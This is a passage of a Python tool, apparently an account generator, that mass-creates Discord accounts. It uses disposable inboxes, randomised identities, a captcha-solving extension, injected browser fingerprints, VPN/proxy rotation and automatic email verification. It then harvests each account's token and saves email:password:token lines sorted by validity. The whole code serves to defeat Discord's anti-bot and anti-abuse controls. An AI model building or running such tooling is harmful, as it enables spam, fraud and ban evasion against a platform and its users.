            (0, 255, 200),
            (255, 255, 255)
        ]
        n = len(message)
        for i, ch in enumerate(message):
            if ch == '\n':
                text.append(ch)
                continue
            t = i / (n - 1) if n > 1 else 0
            pos = t * (len(stops) - 1)
            idx = int(pos)
            frac = pos - idx
            r1, g1, b1 = stops[idx]
            r2, g2, b2 = stops[min(idx + 1, len(stops) - 1)]
            r = int(r1 + (r2 - r1) * frac)
            g = int(g1 + (g2 - g1) * frac)
            b = int(b1 + (b2 - b1) * frac)
            text.append(ch, style=f"rgb({r},{g},{b})")
        return text

    def maskemail(self, email: str) -> str:
        if '@' not in email:
            return email
        username, domain = email.split('@', 1)
        masked = (username[:4] if len(username) > 4 else username[0]) + '****'
        return f"{masked}@{domain}"

    def masktoken(self, token: str) -> str:
        return token[:20] + '***' if len(token) > 20 else token

    def maskip(self, ip: str) -> str:
        if not ip:
            return ip
        if ':' in ip:
            parts = ip.split(':')
            if len(parts) >= 3:
                masked_middle = ':'.join('****' for _ in parts[1:-1])
                return f"{parts[0]}:{masked_middle}:{parts[-1]}"
            return ':'.join(parts[:1] + ['****'])
        if '.' in ip:
            parts = ip.split('.')
            if len(parts) == 4:
                return f"{parts[0]}.***.***.{parts[3]}"
            if len(parts) == 2:
                return f"{parts[0]}.***"
        return re.sub(r'[0-9]', '*', ip)

    def maskfingerprint(self, fingerprint: str) -> str:
        if not fingerprint or len(fingerprint) <= 8:
            return '***'
        return fingerprint[:4] + '***' + fingerprint[-4:]

    def hunt(self, message: str):
        self.gradient(message, "HUNT")

    def solved(self, message: str):
        ts = datetime.now().strftime('%H:%M')
        with self._lock:
            gradient_message = self._gradientize(message)
            line = f"{gray}[{ts}]{reset} {magenta}SOL{reset} {gray}>{reset} {gradient_message}{reset}\n"
            sys.stdout.write(line)
            sys.stdout.flush()
            try:
                self._buffer.append((ts, 'SOLVED', message))
            except Exception:
                pass
            try:
                self._richemit('SOLVED', message)
            except Exception:
                pass

    def warning(self, message: str):
        ts = datetime.now().strftime('%H:%M')
        with self._lock:
            gradient_message = self._gradientize(message)
            line = f"{gray}[{ts}]{reset} {yellow}WAR{reset} {gray}>{reset} {gradient_message}{reset}\n"
            sys.stdout.write(line)
            sys.stdout.flush()
            try:
                self._buffer.append((ts, 'WARNING', message))
            except Exception:
                pass
            try:
                self._richemit('WARNING', message)
            except Exception:
                pass

    def error(self, message: str):
        ts = datetime.now().strftime('%H:%M')
        with self._lock:
            gradient_message = self._gradientize(message)
            line = f"{gray}[{ts}]{reset} {red}ERR{reset} {gray}>{reset} {gradient_message}{reset}\n"
            sys.stdout.write(line)
            sys.stdout.flush()
            try:
                self._buffer.append((ts, 'ERROR', message))
            except Exception:
                pass
            try:
                self._richemit('ERROR', message)
            except Exception:
                pass

    def info(self, message: str):
        ts = datetime.now().strftime('%H:%M')
        with self._lock:
            gradient_message = self._gradientize(message)
            line = f"{gray}[{ts}]{reset} {cyan}INF{reset} {gray}>{reset} {gradient_message}{reset}\n"
            sys.stdout.write(line)
            sys.stdout.flush()
            try:
                self._buffer.append((ts, 'INFO', message))
            except Exception:
                pass
            try:
                self._richemit('INFO', message)
            except Exception:
                pass

    def success(self, message: str):
        ts = datetime.now().strftime('%H:%M')
        with self._lock:
            gradient_message = self._gradientize(message)
            line = f"{gray}[{ts}]{reset} {green}SUC{reset} {gray}>{reset} {gradient_message}{reset}\n"
            sys.stdout.write(line)
            sys.stdout.flush()
            try:
                self._buffer.append((ts, 'SUCCESS', message))
            except Exception:
                pass
            try:
                self._richemit('SUCCESS', message)
            except Exception:
                pass

    def header(self, tg: str = '', threads: int = 1, ip: str = ''):
        with self._lock:
            left = f"tg : {tg}"
            mid = f"Threads : {threads}"
            right = f"IP : {ip}"
            line = f"{purple}{left}{reset}  |  {white}{right}{reset}\n"
            sys.stdout.write(line)
            sys.stdout.flush()

    def debug(self, message: str):
        return

    def batch(self, message: str):
        self.gradient(message, "BATCH")

    def soft(self, message: str):
        ts = datetime.now().strftime('%H:%M')
        with self._lock:
            line = f"{gray}[{ts}]{reset} {soft}{'SOFT':<10}{reset} {gray}│{reset} {soft}{message}{reset}\n"
            sys.stdout.write(line)
            sys.stdout.flush()
            try:
                self._buffer.append((ts, 'SOFT', message))
            except Exception:
                pass
            try:
                self._richemit('SOFT', message)
            except Exception:
                pass

    def gradient(self, message: str, tag: str = "GRADIENT"):
        if tag == "DEBUG":
            return
        if tag == "INFO":
            return self.info(message)
        if tag == "WARNING":
            return self.warning(message)
        if tag == "SUCCESS":
            return self.success(message)
        if tag == "SOLVED":
            return self.solved(message)
        ts = datetime.now().strftime('%H:%M')
        with self._lock:
            if not message:
                line = f"{gray}[{ts}]{reset} {purple}{tag:<10}{reset} {gray}│{reset} {white}{message}{reset}\n"
                sys.stdout.write(line)
                sys.stdout.flush()
                return

            stops = [
                (148, 0, 211),
                (75, 0, 130),
                (0, 128, 255),
                (0, 255, 200),
                (255, 255, 255)
            ]

            n = len(message)
            gradient_text = ""
            for i, ch in enumerate(message):
                if ch == '\n':
                    gradient_text += ch
                    continue
                t = i / (n - 1) if n > 1 else 0
                pos = t * (len(stops) - 1)
                idx = int(pos)
                frac = pos - idx
                r1, g1, b1 = stops[idx]
                r2, g2, b2 = stops[min(idx + 1, len(stops) - 1)]
                r = int(r1 + (r2 - r1) * frac)
                g = int(g1 + (g2 - g1) * frac)
                b = int(b1 + (b2 - b1) * frac)
                gradient_text += f"\033[38;2;{r};{g};{b}m{ch}"

            line = f"{gray}[{ts}]{reset} {purple}{tag:<10}{reset} {gray}│{reset} {gradient_text}{reset}\n"
            sys.stdout.write(line)
            sys.stdout.flush()

    def gradientsuccess(self, message: str):
        self.success(message)

    def gradientwarning(self, message: str):
        self.warning(message)

    def gradientinfo(self, message: str):
        self.info(message)

    def tokenstatus(self, status: str):
        color_map = {'VALID': green, 'LOCKED': yellow, 'INVALID': red}
        color = color_map.get(status, white)
        ts = datetime.now().strftime('%H:%M')
        with self._lock:
            line = f"{gray}[{ts}]{reset} {color}TOK{reset} {gray}>{reset} {color}[{status}]{reset}\n"
            sys.stdout.write(line)
            sys.stdout.flush()

log = Logger()

# ===== SWIFTINBOX API CLASS =====
class SwiftInboxAPI:
    def __init__(self, api_key: str, api_base: str = "https://api.swiftinbox.xyz"):
        self.api_key = api_key
        self.base_url = api_base.rstrip('/')
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            'Content-Type': 'application/json',
            'x-api-key': self.api_key
        })

    def create_inbox(self, domain: str = None, username: str = None) -> dict:
        payload = {"count": 1}
        if domain:
            payload["domain"] = domain
        if username:
            payload["username"] = username
        try:
            resp = self.session.post(f"{self.base_url}/create", json=payload, timeout=30)
        except Exception as e:
            log.error(f"POST /create network error: {e}")
            return None

        if resp.status_code in (200, 201):
            data = resp.json()
            inboxes = data.get("inboxes", [])
            if inboxes:
                return inboxes[0]
            log.error(f"POST /create returned {resp.status_code} but no inboxes: {resp.text}")
            return None

        log.error(f"POST /create failed ({resp.status_code}): {resp.text}")
        return None

    def get_inbox_messages(self, email: str) -> list:
        try:
            resp = self.session.get(f"{self.base_url}/inbox/{email}", timeout=30)
            if resp.status_code == 200:
                data = resp.json()
                if isinstance(data, dict) and "messages" in data:
                    return data["messages"]
                elif isinstance(data, list):
                    return data
            return []
        except Exception as e:
            return []

# ===== EMAIL GENERATION (VIA API) =====
def getswiftmailconfig(config: dict) -> dict:
    providers = config.get("email_providers", {}) or {}
    swiftmail_cfg = providers.get("swiftmail", {}) or {}
    if swiftmail_cfg:
        return swiftmail_cfg
    return providers.get("swiftinbox", {}) or {}

def getswiftmailemail(config: dict) -> tuple:
    s_config = getswiftmailconfig(config)
    if not s_config:
        log.warning("No SwiftMail configuration found")
        return None, None, None, None

    domains = s_config.get("domains", [])
    if not domains:
        log.warning("SwiftMail domains list is empty")
        return None, None, None, None

    api_key = s_config.get("api_key", "").strip()
    if not api_key:
        log.warning("SwiftMail api_key missing – required for fetching messages")
        return None, None, None, None

    api_base = s_config.get("api_base", "https://api.swiftinbox.xyz")
    api = SwiftInboxAPI(api_key=api_key, api_base=api_base)

    domain = random.choice(domains)
    inbox = api.create_inbox(domain=domain)
    if not inbox:
        log.error("SwiftMail API create_inbox failed")
        return None, None, None, None

    email = inbox.get("email", "")
    if not email:
        log.error("SwiftMail API returned empty email")
        return None, None, None, None

    log.success(f"Created SwiftMail inbox: {email}")
    return (email, "", api_key, domain)

def getemailfromprovider(config: dict) -> tuple:
    provider_selection = config.get("provider_selection", "").lower().strip()

    if provider_selection in ["swiftmail", "swiftinbox"]:
        email, password, token, uuid = getswiftmailemail(config)
        if email:
            return email, password, token, uuid, "swiftinbox"

    log.error("No email provider available or all failed")
    return None, None, None, None, None

def generateusername() -> str:
    adjectives = ['Cool', 'Epic', 'Super', 'Mega', 'Ultra', 'Pro', 'Elite', 'Master']
    nouns = ['Gamer', 'Player', 'User', 'Hero', 'Legend', 'Champion', 'Warrior']
    return f"{random.choice(adjectives)}{random.choice(nouns)}{random.randint(1000, 99999)}"

def generatepassword(length: int = 16) -> str:
    chars = string.ascii_letters + string.digits + "!@#$%^&*"
    password = ''.join(random.choices(chars, k=length))
    if not any(c.isupper() for c in password):
        password = password[:1].upper() + password[1:]
    if not any(c.isdigit() for c in password):
        password = password[:-1] + str(random.randint(0, 9))
    return password

def generateformpassword(min_length: int = 8) -> str:
    length = max(min_length, 8)
    chars = string.ascii_letters + string.digits + "!@#$%^&*()"
    password = ''.join(random.choices(chars, k=length))
    if not any(c.isupper() for c in password):
        password = random.choice(string.ascii_uppercase) + password[1:]
    if not any(c.isdigit() for c in password):
        password = password[:-1] + random.choice(string.digits)
    return password

def checktoken(token: str, proxy_config: Dict = None) -> str:
    try:
        session = tls_client.Session(client_identifier="chrome_138")
        if proxy_config:
            proxy_dict = getsessionproxy(proxy_config)
            if proxy_dict:
                session.proxies = proxy_dict
        headers = {'Authorization': token}
        response = session.get('https://discordapp.com/api/v9/users/@me/library', headers=headers)
        if response.status_code == 200:
            return 'VALID'
        elif response.status_code == 403:
            return 'LOCKED'
        elif response.status_code == 401:
            return 'INVALID'
        else:
            return 'INVALID'
    except:
        return 'ERROR'

def saveaccounttofile(email: str, password: str, token: str, status: str):
    try:
        if status == 'VALID':
            output_file = outputdir / "valid.txt"
        elif status == 'LOCKED':
            output_file = outputdir / "locked.txt"
        else:
            output_file = outputdir / "invalid.txt"
        with lock:
            with open(output_file, 'a', encoding='utf-8') as f:
                f.write(f"{email}:{password}:{token}\n")
        
        with accountstatslock:
            if status == 'VALID':
                accountstats['valid'] += 1
            elif status == 'LOCKED':
                accountstats['locked'] += 1
            elif status == 'INVALID':
                accountstats['invalid'] += 1
            
            total = accountstats['valid'] + accountstats['invalid'] + accountstats['locked']
            valid_percent = (accountstats['valid'] / total * 100) if total > 0 else 0
        
        stats_msg = f"Valid: {accountstats['valid']} | Invalid: {accountstats['invalid']} | Locked: {accountstats['locked']} | Valid %: {valid_percent:.1f}%"
        log.success(stats_msg)
    except Exception as e:
        log.error(f"Save failed: {e}")

def checkemailverifiedapi(token: str, proxy_config: Dict = None):
    try:
        session = tls_client.Session(client_identifier="chrome_138")
        if proxy_config:
            proxy_dict = getsessionproxy(proxy_config)
            if proxy_dict:
                session.proxies = proxy_dict
        headers = {'Authorization': token}
        response = session.get('https://discord.com/api/v9/users/@me', headers=headers)
        if response.status_code == 200:
            return response.json().get('verified', False), response.json().get('email', 'N/A')
        return None, None
    except:
        return None, None

async def filldateofbirth(page):
    months = ["January", "February", "March", "April", "May", "June",
              "July", "August", "September", "October", "November", "December"]
    day = str(random.randint(1, 28))
    month = random.choice(months)
    year = str(random.randint(1998,2004))
    
    try:
        result = await page.evaluate(f'''
        (async () => {{
            async function setDobField(label, value) {{
                const el = document.querySelector(`div[aria-label="${{label}}"]`);
                if (!el) return false;
                el.click();
                await new Promise(r => setTimeout(r, 100));
                
                for (let i = 0; i < value.length; i++) {{
                    const char = value[i];
                    document.activeElement.dispatchEvent(new KeyboardEvent('keydown', {{
                        key: char,
                        code: isNaN(char) ? 'Key' + char.toUpperCase() : 'Digit' + char,
                        keyCode: char.toUpperCase().charCodeAt(0),
                        bubbles: true
                    }}));
                    await new Promise(r => setTimeout(r, 50));
                }}
                
                await new Promise(r => setTimeout(r, 100));
                
                document.activeElement.dispatchEvent(new KeyboardEvent('keydown', {{
                    key: 'Enter',
                    code: 'Enter',
                    keyCode: 13,
                    bubbles: true
                }}));
                
                await new Promise(r => setTimeout(r, 100));
                return true;
            }}

            const m = await setDobField("Month", "{month}");
            if (!m) return {{ success: false, error: "Month field not found" }};
            
            const d = await setDobField("Day", "{day}");
            if (!d) return {{ success: false, error: "Day field not found" }};
            
            const y = await setDobField("Year", "{year}");
            if (!y) return {{ success: false, error: "Year field not found" }};
            
            document.body.click();
            await new Promise(r => setTimeout(r, 150));
            
            const buttons = document.querySelectorAll('button');
            for (const btn of buttons) {{
                const text = btn.textContent || '';
                if (text.includes('Continue') || text.includes('Create') || text.includes('Submit') || text.includes('Register')) {{
                    btn.click();
                    break;
                }}
            }}
            
            return {{ success: true }};
        }})()
        ''')

        if result and isinstance(result, dict) and result.get('success'):
            log.success(f"DOB: {month} {day}, {year}")
        else:
            log.gradient(f"DOB failed: {result}", "DEBUG")

    except Exception as e:
        log.debug(f"DOB error: {e}")

async def fillregistrationform(page, email: str, display_name: str, username: str, password: str) -> bool:
    try:
        email_element = await page.wait_for('input[name="email"]', timeout=10000)
        await email_element.send_keys(email)
        await asyncio.sleep(0.1)
        
        display_element = await page.wait_for('input[name="global_name"]', timeout=5000)
        await display_element.send_keys(display_name)
        await asyncio.sleep(0.1)
        
        username_element = await page.wait_for('input[name="username"]', timeout=5000)
        await username_element.send_keys(username)
        await asyncio.sleep(0.1)
        
        password_element = None
        selectors = [
            'input[aria-label="Password"]',
            'input[name="password"]',
            'input[type="password"]'
        ]
        
        for selector in selectors:
            try:
                password_element = await page.query_selector(selector)
                if password_element:
                    break
            except:
                continue
        
        if password_element:
            await password_element.send_keys(password)
            await asyncio.sleep(0.2)
        else:
            pass
        
        await asyncio.sleep(0.2)
        await filldateofbirth(page)
        await asyncio.sleep(0.1)
        
        try:
            await page.evaluate(jsutils)
            await asyncio.sleep(0.1)
            result = await page.evaluate('window.utils.clickAllCheckboxes()')
            if result and result.get('clicked', 0) > 0:
                log.success(f"✓ Clicked {result.get('clicked')} checkbox(es)")
        except Exception as e:
            pass
        
        clicked = False
        await asyncio.sleep(0.3)
        
        try:
            buttons = await page.query_selector_all('button')
            for button in buttons:
                try:
                    text = await button.get('textContent') or ""
                    if text and any(keyword in text for keyword in ['Continue', 'Create', 'Submit', 'Register']):
                        await button.click()
                        clicked = True
                        break
                except:
                    continue
        except:
            pass
        
        if not clicked:
            try:
                submit = await page.query_selector('[type="submit"]')
                if submit:
                    await submit.click()
                    clicked = True
            except:
                pass
        
        if not clicked:
            try:
                clicked = await page.evaluate('''() => {
                    const buttons = document.querySelectorAll('button');
                    for (const btn of buttons) {
                        const text = btn.textContent || '';
                        if (text.includes('Continue') || text.includes('Create') || text.includes('Submit')) {
                            btn.click();
                            return true;
                        }
                    }
                    return false;
                }''')
                if clicked:
                    log.success("Clicked submit via evaluate")
            except:
                pass
        
        if not clicked:
            log.error("Could not find submit button")
            return False
        
        return True
        
    except Exception as e:
        log.error(f"Form fill error: {e}")
        return False

async def waitforaccountcreation(page, timeout: int = 300) -> bool:
    start_time = time.time()
    last_url = ""

    while (time.time() - start_time) < timeout:
        await asyncio.sleep(0.5)

        try:
            try:
                current_url = await page.evaluate('window.location.href')
                if hasattr(current_url, 'value'):
                    current_url = current_url.value or ""
                elif isinstance(current_url, tuple):
                    current_url = str(current_url[0]) if current_url[0] else ""
                else:
                    current_url = str(current_url) if current_url else ""
            except Exception:
                current_url = ""

            if current_url and current_url != last_url:
                last_url = current_url

            if not current_url:
                continue

            skip = ['discord.com/register', 'discord.com/login', 'about:blank', 'chrome://']
            if 'discord.com' in current_url and not any(s in current_url for s in skip):
                return True

        except Exception as e:
            pass

    log.error("Timeout waiting for account creation")
    return False

async def waitfordiscordtoken(page, timeout: int = 30, email: str = None, password: str = None, proxy_config: Dict = None):
    if not email or not password:
        log.error("Email and password required")
        return None
    
    await asyncio.sleep(3)
    
    attempts = 0
    max_attempts = 5
    
    while attempts < max_attempts:
        attempts += 1
        try:
            token = await fetchdiscordtoken(email, password, proxy_config)
            if token:
                return token
            else:
                pass
        except Exception as e:
            pass
        
        await asyncio.sleep(3)
    
    log.error("Could not fetch token")
    return None

# ===== SWIFTINBOX VERIFICATION FUNCTION =====
async def verifyemailswiftinbox(email: str, api_key: str, browser, token: str, domain: str = None, api_base: str = None, timeout: int = 180) -> bool:
    api = SwiftInboxAPI(api_key=api_key, api_base=api_base or "https://api.swiftinbox.xyz")
    start_time = time.time()

    while (time.time() - start_time) < timeout:
        try:
            messages = api.get_inbox_messages(email)
            if not messages:
                await asyncio.sleep(5)
                continue

            for msg in messages:
                sender = msg.get("sender", "").lower()
                subject = msg.get("subject", "").lower()
                body = msg.get("body", "")
                body_html = msg.get("body_html", "")
                combined = body + " " + body_html

                # Check if this email is from Discord (anywhere)
                if "discord" not in sender and "discord" not in subject and "discord" not in combined:
                    continue

                log.success(f"Found Discord email from {sender} (subject: {subject})")

                # Try to extract verification link
                # 1. Direct Discord verify link
                verify_pattern = r'https?://discord\.com/verify\?token=[a-zA-Z0-9_\-\.]+'
                match = re.search(verify_pattern, combined)
                if match:
                    verify_url = match.group(0)
                    log.success("Found direct verification URL!")
                    return await verifyemailwithurl(browser, verify_url, token)

                # 2. Follow click.discord.com / links.discord.com redirects
                click_patterns = [
                    r'https?://click\.discord\.com/ls/click\?[^\s"\'<>]+',
                    r'https?://links\.discord\.com[^\s"\'<>]+'
                ]
                for pattern in click_patterns:
                    for match in re.finditer(pattern, combined):
                        url = match.group(0)
                        try:
                            session_req = requests.Session()
                            session_req.verify = False
                            resp_req = session_req.get(url, allow_redirects=True, timeout=10)
                            final_url = resp_req.url
                            if "discord.com/verify" in final_url:
                                log.success("Found verification URL via redirect!")
                                return await verifyemailwithurl(browser, final_url, token)
                            verify_in_body = re.search(r'https?://discord\.com/verify\?token=[a-zA-Z0-9_\-\.]+', resp_req.text)
                            if verify_in_body:
                                log.success("Found verification URL in redirect response!")
                                return await verifyemailwithurl(browser, verify_in_body.group(0), token)
                        except Exception:
                            continue

                # 3. Extract token from message (fallback)
                token_pattern = r'token[=:][\s]*["\']?([a-zA-Z0-9_\-\.]+)["\']?'
                token_match = re.search(token_pattern, combined, re.IGNORECASE)
                if token_match:
                    extracted_token = token_match.group(1)
                    if '.' in extracted_token and len(extracted_token) > 50:
                        verify_url = f"https://discord.com/verify?token={extracted_token}"
                        log.success("Found verification token in email!")
                        return await verifyemailwithurl(browser, verify_url, token)

                # If we get here, we found a Discord email but no verification link – keep polling
                log.warning("Discord email found but no verification URL extracted – will keep polling")

            await asyncio.sleep(5)
        except Exception as e:
            log.debug(f"SwiftInbox check error: {e}")
            await asyncio.sleep(5)

    log.warning(f"Discord verification email not found after {timeout} seconds")
    return False

async def verifyemailwithurl(browser, verify_url: str, token: str, timeout: int = 60) -> bool:
    if not verify_url:
        return False
    
    try:
        page = await browser.get(verify_url)
        await asyncio.sleep(5)
        
        for _ in range(timeout // 5):
            await asyncio.sleep(5)
            verified, _ = checkemailverifiedapi(token)
            if verified:
                return True
        
        return True
    except Exception as e:
        log.warning(f"Error opening verification URL: {e}")
        return False

async def worker(worker_id: int, proxy_config: Dict = None, fingerprint: str = None):
    global sessioncreated, sessionstop, activeworkers

    if sessionstop:
        if fingerprint:
            releasefingerprint(fingerprint)
        return

    with workerlock:
        activeworkers += 1

    browser = None
    temp_profile = None
    fingerprint_removed = False
    current_fingerprint = None

    try:
        if mullvadavailable:
            if config.get("mullvad", {}).get("auto_login", False):
                if not mullvadautologinrecentaccount():
                    log.error("Mullvad auto-login aborted because the recent account is revoked or invalid")
                    return
            # Use the new helper to get a random country
            country = get_mullvad_country(config)
            log.info(f"Rotating to Mullvad country: {country}")
            if not mullvadrotate(country):
                log.error(f"Mullvad rotate failed for {country}, skipping")
                return

        first_names = ['Alex', 'Jordan', 'Taylor', 'Morgan', 'Casey', 'Riley', 'Sam', 'Blake', 'Drew', 'Avery', 'Jamie', 'Parker', 'Cameron', 'Dakota', 'Skyler', 'Quinn', 'Reese', 'Sage', 'River', 'Phoenix', 'Devon', 'Adrian', 'Bailey', 'Chase', 'Dakota', 'Ellis', 'Finley', 'Gray', 'Harper', 'Indigo', 'Jackie', 'Kennedy', 'Logan', 'Morgan', 'Noah', 'Ocean', 'Paris', 'Quinn', 'Robin', 'Sage', 'Taylor', 'Union', 'Vale', 'Wade', 'Xander', 'York', 'Zephyr', 'Aaron', 'Benjamin', 'Christopher', 'Daniel', 'Edward', 'Frank', 'George', 'Henry', 'Isaac', 'James', 'Kevin', 'Leonard', 'Michael', 'Nathan', 'Oliver', 'Patrick', 'Quinn', 'Robert', 'Steven', 'Thomas', 'Ulysses', 'Victor', 'William', 'Xavier', 'Yuki', 'Zachary', 'Alice', 'Bella', 'Charlotte', 'Diana', 'Elena', 'Fiona', 'Grace', 'Hannah', 'Iris', 'Jessica', 'Katherine', 'Laura', 'Michelle', 'Nancy', 'Olivia', 'Paige', 'Quinley', 'Rachel', 'Sophia', 'Tessa', 'Ursula', 'Victoria', 'Wendy', 'Ximena', 'Yasmine', 'Zoe']
        surnames = ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia', 'Miller', 'Davis', 'Rodriguez', 'Martinez', 'Wilson', 'Anderson', 'Taylor', 'Thomas', 'Moore', 'Jackson', 'Martin', 'Lee', 'Perez', 'Thompson', 'White', 'Harris', 'Sanchez', 'Clark', 'Ramirez', 'Lewis', 'Robinson', 'Walker', 'Young', 'Allen', 'King', 'Wright', 'Lopez', 'Hill', 'Scott', 'Green', 'Adams', 'Nelson', 'Carter', 'Roberts', 'Edwards', 'Collins', 'Reeves', 'Morris', 'Murphy', 'Rogers', 'Morgan', 'Peterson', 'Cooper', 'Reed', 'Bell', 'Gomez', 'Murray', 'Freeman', 'Wells', 'Webb', 'Simpson', 'Stevens', 'Tucker', 'Porter', 'Hunter', 'Hicks', 'Crawford', 'Henry', 'Boyd', 'Mason', 'Moreno', 'Kennedy', 'Warren', 'Dixon', 'Ramos', 'Reeves', 'Burns', 'Gordon', 'Shaw', 'Holmes', 'Rice', 'Robertson', 'Hunt', 'Black', 'Daniels', 'Palmer', 'Mills', 'Nicholson', 'Grant', 'Knight', 'Ferguson', 'Stone', 'Hawkins', 'Dunn', 'Perkins', 'Hudson', 'Spencer', 'Gardner', 'Stephens', 'Payne', 'Pierce', 'Berry', 'Matthews', 'Arnold', 'Wagner', 'Willis', 'Ray', 'Watkins', 'Olson', 'Carroll', 'Duncan', 'Snyder', 'Hart', 'Cunningham', 'Knight', 'Chase', 'Wyatt']
        
        first_name = random.choice(first_names).lower()
        last_name = random.choice(surnames).lower()
        display_name = first_name.capitalize() + ' ' + last_name.capitalize()
        
        base_words = ['fireplayer', 'darklord', 'shadowking', 'icequeen', 'stormrider', 'thunderbolt', 'nightwalker', 'silentassassin', 'crimsonfury', 'goldenphoenix', 'mysticdragon', 'blazingstar', 'frostgiant', 'ironwolf', 'skywarrior', 'nightshade', 'dragonfire', 'thunderstrike', 'shadowhunter', 'darkphoenix', 'warriorking', 'queenofhearts', 'knightrider', 'dragonlord', 'phoenixfire', 'wolfpack', 'shadowstrike', 'thunderlord', 'frostbite', 'firestorm']
        base = random.choice(base_words)
        target_length = random.randint(25, 30)
        num_count = target_length - len(base)
        random_numbers = ''.join(str(random.randint(0, 9)) for _ in range(max(0, num_count)))
        discord_username = base + random_numbers
        
        email, email_password, email_token, email_uuid, email_provider = getemailfromprovider(config)
        if not email:
            log.error(f"Failed to get email")
            return
        
        account_password = email_password or generateformpassword(10)
        log.gradientsuccess(f"Email: {log.maskemail(email)}")
        
        temp_profile = tempfile.mkdtemp()
        browser_args = [
            f'--user-data-dir={temp_profile}',
            '--disable-backgrounding-occluded-windows',
            '--disable-background-timer-throttling',
            '--disable-renderer-backgrounding',
            '--disable-throttling',
            '--no-first-run',
            '--disable-default-apps',
            '--disable-features=IsolateOrigins,site-per-process,ChromeWhatsNewUI',
            '--disable-dev-shm-usage',
            '--disable-breakpad',
            '--disable-component-extensions-with-background-pages',
            '--disable-features=TranslateUI,MediaRouter,OptimizationHints',
            '--disable-domain-reliability',
            '--window-size=960,1070',
            '--window-position=0,0',
            '--force-device-scale-factor=1',
        ]
        
        if proxy_config and not mullvadavailable:
            browser_args.extend(getbrowserproxyargs(proxy_config))

        if nopechaextdir.exists():
            browser_args.append(f'--load-extension={nopechaextdir}')
        
        current_key = getcurrentnopechakey()
        injected_key = False
        if current_key:
            injected_key = injectnopechakey(current_key)
        
        current_fingerprint = fingerprint
        if current_fingerprint:
            install_num = getfingerprintinstallationnumber(current_fingerprint)
            fp_value = getfingerprintvalue(current_fingerprint)
            install_id = getfingerprintinstallationid(current_fingerprint)
            fingerprint_label = f"Fingerprint#{install_num}" if install_num else "Fingerprint"
            fingerprint_text = f" {log.maskfingerprint(fp_value or current_fingerprint)}"
            if install_id:
                fingerprint_text += f" (install {install_id})"
            if injected_key:
                log.gradientinfo(f"{fingerprint_text}")
            else:
                log.gradientinfo(fingerprint_text)
        elif injected_key:
            log.gradientinfo("NopeCHA key injected")
        
        browser = await uc.start(
            headless=False,
            browser_executable_path=bravepath if bravepath else None,
            browser_args=browser_args,
        )
        
        if proxy_config and proxy_config.get('username'):
            await setupproxyauth(browser, proxy_config)
        
        page = await browser.get("https://discord.com/register")
        if not page:
            log.error(f"Could not get page")
            return

        if current_fingerprint:
            injected_fp = await injectfingerprinttopage(page, current_fingerprint)
            if injected_fp:
                log.gradientsuccess("Fingerprint metadata injected into page storage")
            else:
                log.warning("Fingerprint injection failed")

        if not page:
            log.error(f"Could not get page")
            return
        
        page_loaded = False
        reload_count = 0
        MAX_RELOADS = 2
        
        for attempt in range(120):
            try:
                if await page.query_selector('input[name="email"]'):
                    page_loaded = True
                    break
            except Exception:
                pass
            
            if attempt == 30 and reload_count < MAX_RELOADS:
                reload_count += 1
                log.warning(f"Page not loaded after 30s, refreshing (attempt {reload_count}/{MAX_RELOADS})")
                try:
                    await page.reload()
                    await asyncio.sleep(3)
                except Exception as e:
                    log.warning(f"Reload failed: {e}")
                continue
            
            if attempt == 90 and reload_count < MAX_RELOADS:
                reload_count += 1
                log.warning(f"Page still not loaded after 90s, refreshing (attempt {reload_count}/{MAX_RELOADS})")
                try:
                    await page.reload()
                    await asyncio.sleep(3)
                except Exception as e:
                    log.warning(f"Reload failed: {e}")
                continue
            
            if attempt > 0 and attempt % 10 == 0 and not page_loaded:
                log.info(f"Waiting for page to load... ({attempt}s elapsed)")
            
            await asyncio.sleep(1)
        
        if not page_loaded:
            log.error(f"Register page did not load after 120s and {reload_count} reload(s) - skipping this worker")
            return
        
        log.info("Loaded Register Page")
        await asyncio.sleep(0.5)

        success = await fillregistrationform(page, email, display_name, discord_username, account_password)
        if not success:
            log.error(f"Form fill failed")
            return
        
        log.success("Form filled successfully")
        
        created = await waitforaccountcreation(page, timeout=180)
        
        if not created:
            log.error(f"Creation failed")
            return

        token = await waitfordiscordtoken(page, email=email, password=account_password, proxy_config=proxy_config)
        
        if token:
            if token.startswith('"') and token.endswith('"'):
                token = token[1:-1]

            token_match = re.search(r'([a-zA-Z0-9_-]{20,})\.([a-zA-Z0-9_-]{6})\.([a-zA-Z0-9_-]{27,})', token)
            if token_match:
                token = f"{token_match.group(1)}.{token_match.group(2)}.{token_match.group(3)}"
            
            log.gradient(f"Account Genned > {log.masktoken(token)}", "SOV")
            
            if email_provider == "swiftinbox":
                s_config = config.get("email_providers", {}).get("swiftinbox", {})
                # If not found, try the swiftmail config (fallback)
                if not s_config:
                    s_config = config.get("email_providers", {}).get("swiftmail", {})
                api_key = s_config.get("api_key", "").strip()
                api_base = s_config.get("api_base", "https://api.swiftinbox.xyz")
                domain = email.split('@')[1] if '@' in email else s_config.get("domains", [""])[0]
                # Use 180 seconds timeout (3 minutes)
                verified = await verifyemailswiftinbox(
                    email, api_key, browser, token, domain, api_base, timeout=180
                )
                if verified:
                    log.success(f"Email verified!")
                else:
                    log.warning(f"Email verification failed")
                    unverified_file = outputdir / "unverified.txt"
                    with lock:
                        with open(unverified_file, 'a', encoding='utf-8') as f:
                            f.write(f"{email}:{account_password}:{token}\n")
                    log.info(f"Saved unverified account to unverified.txt")
            
            result = checktoken(token, proxy_config)
            log.tokenstatus(result)
            saveaccounttofile(email, account_password, token, result)
            
            if current_fingerprint:
                install_num = getfingerprintinstallationnumber(current_fingerprint)
                fingerprint_label = f"Fingerprint#{install_num}" if install_num else "Fingerprint"
                consumefingerprint(current_fingerprint)
                fingerprint_removed = True
                log.info(f"Consumed {fingerprint_label} for token: {log.maskfingerprint(current_fingerprint)}")

            with lock:
                sessioncreated += 1
                created_now = sessioncreated

            if sessiontarget > 0 and created_now >= sessiontarget:
                with lock:
                    sessionstop = True
        else:
            pass
            
    except StopIteration:
        log.warning("Worker stopped due to StopIteration")
    except Exception as e:
        log.error(f"Error: {e}")
    
    finally:
        if not fingerprint_removed and current_fingerprint:
            releasefingerprint(current_fingerprint)
        if browser:
            try:
                await browser.stop()
            except:
                pass
        if temp_profile and os.path.exists(temp_profile):
            try:
                shutil.rmtree(temp_profile, ignore_errors=True)
            except:
                pass
        with workerlock:
            activeworkers -= 1
            
async def batchcooldown(batch_size: int, accounts_created: int):
    if accounts_created == 0:
        return
    for remaining in range(cooldownseconds, 0, -1):
